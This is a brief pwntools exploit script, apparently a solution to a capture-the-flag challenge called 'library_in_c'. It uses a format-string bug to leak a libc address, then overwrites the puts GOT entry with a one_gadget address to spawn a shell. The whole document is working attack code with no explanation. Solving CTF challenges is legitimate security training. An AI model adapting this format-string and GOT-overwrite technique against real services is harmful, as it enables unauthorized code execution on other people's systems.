from pwn import *

context.clear(arch='amd64', os='linux')
#s=remote("shell.actf.co",20201)
s=process("./library_in_c_patched")
exe=ELF('./library_in_c_patched')
libc= ELF("libc.so.6")

payload = '%27$p'
s.sendlineafter('name?\n', payload)
s.recvuntil('Why hello there ')
leak = int(s.recvline()[:-1], 16) - 240
libc.address = leak - libc.sym['__libc_start_main']

print (hex(libc.address))

one_gadget = libc.address + 0x4526a
write = {
    exe.got['puts'] : one_gadget
}

payload = fmtstr_payload(16, write, write_size='short')

s.sendlineafter('out?\n', payload)

s.interactive()

